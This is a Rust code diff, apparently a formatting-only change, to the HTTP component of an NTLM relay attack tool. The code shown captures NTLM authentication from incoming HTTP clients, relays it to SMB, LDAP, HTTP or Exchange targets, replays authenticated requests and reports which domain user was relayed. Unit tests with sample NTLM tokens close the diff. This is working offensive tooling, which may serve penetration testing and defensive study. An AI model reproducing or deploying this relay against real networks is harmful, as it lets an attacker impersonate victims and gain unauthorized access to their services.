@@ -88,9 +88,10 @@ impl HttpAsymmetricRelay {
         }
 
         if self.config.targets.is_empty() {
-            return Err(
-                RelayError::Config("No relay targets configured for HTTP asymmetric relay".into()).into(),
-            );
+            return Err(RelayError::Config(
+                "No relay targets configured for HTTP asymmetric relay".into(),
+            )
+            .into());
         }
 
         let relay_config = RelayConfig {
@@ -136,7 +137,10 @@ impl HttpAsymmetricRelay {
                     l
                 }
                 Err(e) => {
-                    warn!("Failed to bind HTTP asymmetric relay to {}: {}", listen_addr, e);
+                    warn!(
+                        "Failed to bind HTTP asymmetric relay to {}: {}",
+                        listen_addr, e
+                    );
                     return;
                 }
             };
@@ -244,7 +248,9 @@ fn handle_client(
     // Call NTLM relay Phase 2: authenticate -> session
     let session = bridge.handle.block_on(async {
         let mut guard = bridge.relay.lock().await;
-        guard.relay_authenticate(relay_id, &authenticate_bytes).await
+        guard
+            .relay_authenticate(relay_id, &authenticate_bytes)
+            .await
     });
 
     match session {
@@ -266,9 +272,13 @@ fn handle_client(
                 )
             } else {
                 // For non-HTTP targets (SMB, LDAP, etc.), return relay success
-                let body_text = format!("Relay succeeded: {}\\{} -> {}://{}\n",
-                    session.domain, session.username,
-                    session.target.protocol, session.target.address);
+                let body_text = format!(
+                    "Relay succeeded: {}\\{} -> {}://{}\n",
+                    session.domain,
+                    session.username,
+                    session.target.protocol,
+                    session.target.address
+                );
                 Ok(format!(
                     "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                     body_text.len(),
@@ -294,10 +304,7 @@ fn handle_client(
             }
         }
         Err(e) => {
-            warn!(
-                "HTTP asymmetric relay failed (id={}): {}",
-                relay_id, e
-            );
+            warn!("HTTP asymmetric relay failed (id={}): {}", relay_id, e);
             let resp =
                 "HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
             let _ = stream.write_all(resp.as_bytes());
@@ -308,7 +315,10 @@ fn handle_client(
 
 /// Check if the target protocol supports HTTP-style request replay.
 fn is_http_target(protocol: &Protocol) -> bool {
-    matches!(protocol, Protocol::Http | Protocol::Https | Protocol::Webdav | Protocol::Exchange)
+    matches!(
+        protocol,
+        Protocol::Http | Protocol::Https | Protocol::Webdav | Protocol::Exchange
+    )
 }
 
 /// Read the full HTTP request including body (Content-Length aware).
@@ -327,10 +337,14 @@ fn read_full_request(stream: &mut TcpStream) -> Result<CapturedHttpRequest> {
 
     // Parse request line
     let mut lines = request_str.lines();
-    let request_line = lines.next().ok_or_else(|| RelayError::Protocol("Empty request line".into()))?;
+    let request_line = lines
+        .next()
+        .ok_or_else(|| RelayError::Protocol("Empty request line".into()))?;
     let parts: Vec<&str> = request_line.splitn(3, ' ').collect();
     if parts.len() < 2 {
-        return Err(RelayError::Protocol(format!("Malformed request line: {}", request_line)).into());
+        return Err(
+            RelayError::Protocol(format!("Malformed request line: {}", request_line)).into(),
+        );
     }
 
     let method = parts[0].to_string();
@@ -416,22 +430,18 @@ fn replay_authenticated_request(
     auth_b64: &str,
     _socks5_proxy: Option<&str>,
 ) -> Result<String> {
-    let mut target_stream = TcpStream::connect_timeout(
-        &target.address,
-        Duration::from_secs(10),
-    )
-    .map_err(|e| RelayError::Network(format!("Target connect: {}", e)))?;
+    let mut target_stream = TcpStream::connect_timeout(&target.address, Duration::from_secs(10))
+        .map_err(|e| RelayError::Network(format!("Target connect: {}", e)))?;
 
-    target_stream
-        .set_read_timeout(Some(IO_TIMEOUT))
-        .ok();
-    target_stream
-        .set_write_timeout(Some(IO_TIMEOUT))
-        .ok();
+    target_stream.set_read_timeout(Some(IO_TIMEOUT)).ok();
+    target_stream.set_write_timeout(Some(IO_TIMEOUT)).ok();
 
     // Build the authenticated request by replacing/re-adding the NTLM Authorization header
     let mut replay = String::new();
-    replay.push_str(&format!("{} {} {}\r\n", request.method, request.uri, request.http_version));
+    replay.push_str(&format!(
+        "{} {} {}\r\n",
+        request.method, request.uri, request.http_version
+    ));
 
     let mut has_auth = false;
     for (name, value) in &request.headers {
@@ -501,10 +511,7 @@ fn base64_decode(data: &str) -> Result<Vec<u8>> {
 
 fn strip_ntlm_prefix(header: &str) -> &str {
     let h = header.trim();
-    for prefix in &[
-        "Authorization: NTLM ",
-        "authorization: ntlm ",
-    ] {
+    for prefix in &["Authorization: NTLM ", "authorization: ntlm "] {
         if h.to_lowercase().starts_with(&prefix.to_lowercase()) {
             return &h[prefix.len()..];
         }
@@ -534,7 +541,10 @@ mod tests {
     fn test_extract_ntlm_token_found() {
         let headers = vec![
             ("Host".to_string(), "test".to_string()),
-            ("Authorization".to_string(), "NTLM TlRMTVNTUAABAAAA".to_string()),
+            (
+                "Authorization".to_string(),
+                "NTLM TlRMTVNTUAABAAAA".to_string(),
+            ),
         ];
         assert_eq!(
             extract_ntlm_token(&headers),
@@ -550,9 +560,10 @@ mod tests {
 
     #[test]
     fn test_extract_ntlm_token_lowercase() {
-        let headers = vec![
-            ("authorization".to_string(), "ntlm TlRMTVNTUAABAAAA".to_string()),
-        ];
+        let headers = vec![(
+            "authorization".to_string(),
+            "ntlm TlRMTVNTUAABAAAA".to_string(),
+        )];
         assert_eq!(
             extract_ntlm_token(&headers),
             Some("TlRMTVNTUAABAAAA".to_string())
